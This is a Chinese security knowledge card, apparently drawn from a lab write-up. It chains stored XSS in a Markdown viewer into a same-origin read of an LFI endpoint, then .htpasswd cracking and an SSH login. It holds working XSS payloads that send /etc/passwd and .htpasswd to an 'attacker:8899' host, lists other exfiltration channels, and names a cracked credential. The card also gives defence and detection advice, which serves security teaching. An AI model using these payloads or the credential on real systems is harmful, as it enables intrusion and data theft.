---
id: web-generic-xss-markdown-viewer-lfi-htpasswd-ssh
title: Markdown 查看器的存储型 XSS 当作同源代理：读取 PHP 源码与 .htpasswd，破解后 SSH 立足
type: scenario
domain: web
path: web/generic/xss
technique: stored-xss-same-origin-proxy-lfi-credential-harvest
aliases:
- XSS 读文件建立立足点
- XSS 当同源代理打 LFI
- Markdown 渲染存储型 XSS
- fetch 读取同源页面源码
- htpasswd 爆破 SSH
tags:
- web
- xss
- stored-xss
- lfi
- file-read
- credential
- htpasswd
- password-cracking
- linux
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:20:59+08:00'
  notes: 已对照原文核对；本次核对未读取图片；index.php?page=alert 的 Markdown 查看器、提交 md 触发 <script>alert、gobuster 得到 messages.php、fetch 同源读 index.php/messages.php 并用 btoa 外带回连、messages.php?file=../../etc/passwd 读 /etc/passwd 得 albert/david、读 /var/www/statistics.alert.htb 下口令文件后 john 破出 albert:manchesterunited 并 SSH，均与正文一致；未验证点：原文该口令文件写作 .htpaswd（疑为 .htpasswd 笔误），卡内按标准名写 .htpasswd，实际文件名需目标环境确认；原文未明确称该 XSS 为存储型（是提交 md 后渲染触发，卡内判断为持久化）；提权段 pspy+可写 root 脚本已按跳过处理
---

## 一句话结论

当站点允许提交 Markdown 并原样渲染、且同源侧存在带 `file=` 参数的本地文件读取接口（或被会话/来源限制保护、攻击者直接访问不到的页面）时，存储型 XSS 可以在受害者浏览器里以同源身份 `fetch` 这些接口，把 PHP 源码、`/etc/passwd`、`.htpasswd` base64 外带到攻击者服务器，破解出系统账号口令后直接 SSH 登录，把“一个弹窗”升级为可用凭据。

## 原理

- Markdown 查看器（`index.php?page=<name>`）把用户提交的 Markdown 渲染成 HTML，未过滤 `<script>`，于是提交的内容变成持久化的同源脚本，页面每次被访问都会执行。
- 浏览器同源策略只限制跨源读取，不限制页面读取**自己站点**的响应。攻击者在受害者（管理员/机器人）会话里执行的 JS，可以访问攻击者本人访问不到的资源：需要会话 Cookie 的页面、按来源 IP 限制的后台、以及只允许本地访问的接口。XSS 因此等价于一个“同源读取代理”。
- 本例的关键接口是 `messages.php?file=...`：直接请求读不出来，但同源 JS 能读；拿到源码后又发现该参数直接拼接进文件读取函数，属于典型 LFI。把 `file=../../../../etc/passwd` 放进 `fetch`，`resp.text()` 得到内容，`btoa` 编码后拼到攻击者 URL 的查询串上，浏览器即完成外带（base64 避免二进制/换行与 URL 编码问题）。
- 目录里还存在 `.htpasswd`：Apache 的 basic 认证口令文件，格式为 `user:hash`，常见 `$apr1$`（md5crypt）。哈希可离线爆破，得到明文后即可用于 SSH（同一口令复用）或其他服务。
- 整链成立的原因是多处“只做了一半”的防护叠加：Markdown 渲染不过滤脚本、文件读取接口用相对路径拼接且无白名单、口令文件放在 Web 可达目录、系统账号与 Web 口令同源复用。

## 触发条件

- 应用存在可持久化的 HTML/脚本注入点（Markdown/富文本/评论/资料字段），且会被他人（管理员、审核机器人）访问。
- 受害者会话能访问到攻击者访问不到的接口：带文件读取参数的页面、内网/来源限制的管理接口。
- 目标站点允许外带（存在 CSP 则需 `connect-src` 或可用的 `img`/导航外带通道）。
- 系统上存在可读的凭据类文件（`/etc/passwd`、`.htpasswd`、`.env`、源码配置），且存在口令复用或可爆破的弱哈希。

## 利用步骤

1. 找到可提交并持久渲染 Markdown 的入口，先提交最小载荷验证执行：`<script>alert('x')</script>`。
2. 用目录爆破/子域枚举找同源可疑接口（如 `messages.php`、`admin.php`、内部统计站）。
3. 在同源脚本里 `fetch` 目标路径，把 `resp.text()` 做 `btoa` 后回连攻击者 HTTP 服务，先读 `index.php` 确认结构。
4. 从源码里找文件读取/包含的参数名与过滤方式，读 `/etc/passwd` 枚举用户，再读 `.htpasswd`、`.env`、应用配置拿到哈希或明文凭据。
5. `john`/`hashcat` 离线爆破哈希（`$apr1$` 用 `--format=md5crypt`/`-m 1600`），得到明文。
6. 用该凭据尝试 SSH/其他服务，得到系统 shell 作为立足点。

## PoC

最小外带读取器（`btoa` 编码后回连，避免特殊字符被截断）：

```html
<script>
window.onload = function(){
  fetch("http://victim/messages.php?file=../../../../../../etc/passwd")
    .then(r => r.text())
    .then(t => fetch("http://attacker:8899/?d=" + btoa(t)))
    .catch(e => fetch("http://attacker:8899/?err=" + e));
}
</script>
```

接收端：

```bash
python3 -m http.server 8899
# 从日志取出 d= 参数后： echo '<b64>' | base64 -d
```

批量读取多个文件时把路径做参数化，一次打包外带：

```html
<script>
(async () => {
  const out = {};
  for (const p of ["../../etc/passwd", "/var/www/site/.htpasswd",
                   "index.php", "messages.php"]) {
    const r = await fetch("/messages.php?file=" + encodeURIComponent(p));
    out[p] = btoa(await r.text());
  }
  fetch("http://attacker:8899/?d=" + btoa(JSON.stringify(out)));
})();
</script>
```

## 变体与关联

- 变体：没有回连出路时改用 `new Image().src = "http://attacker/?d=" + ...`、`location = "http://attacker/?d="`、DNS 外带或 `navigator.sendBeacon`；存在 CSP 时优先找 `img-src`/`connect-src` 允许的域。
- 变体：目标是“按来源 IP 限制”的内网面板时，XSS 页就是跳板，用法从“读文件”改为“调用面板 API 并回带响应”。
- 变体：读到的不是口令哈希而是 `.env`/数据库配置时，转向数据库直连或云凭据使用。
- 关联：[[web-generic-xss-admin-blind-stored-registration]]（盲打管理员触发）、[[web-generic-xss-wkhtmltopdf-local-file-read-shadow-login]]（渲染上下文读本地文件后破解登录）、[[web/php/file-inclusion]]（LFI 参数与伪协议扩展）。
- 边界：Markdown 渲染做了严格 sanitize、Cookie 为 `HttpOnly` 且接口本身有独立鉴权、CSP 阻断外带、口令强随机时，本链断在对应环节。

## 检测与防御

- 渲染层：Markdown/富文本输出做白名单 sanitize（禁 `<script>`、事件属性、`javascript:`/`data:` URL），或用结构化字段代替富文本。
- 接口层：文件读取参数改成 ID 映射到固定目录，禁止 `..`、绝对路径与用户拼接；口令文件、配置、源码放在 Web 根目录之外。
- 外带层：下发严格 CSP（`default-src 'self'`，不放开任意 `connect-src`/`img-src`），关键 Cookie 设 `HttpOnly`、`SameSite`。
- 凭据层：`.htpasswd` 使用强哈希（bcrypt/argon2）与强口令，且与系统账号口令分离；禁止 Web 口令复用到 SSH。
- 检测：Markdown 内容中出现 `<script>`/`fetch`/`btoa`；短时间内同一来源对 `?file=` 类参数请求 `/etc/passwd`、`.htpasswd` 等路径；异常回连外带请求（长 base64 查询串）。
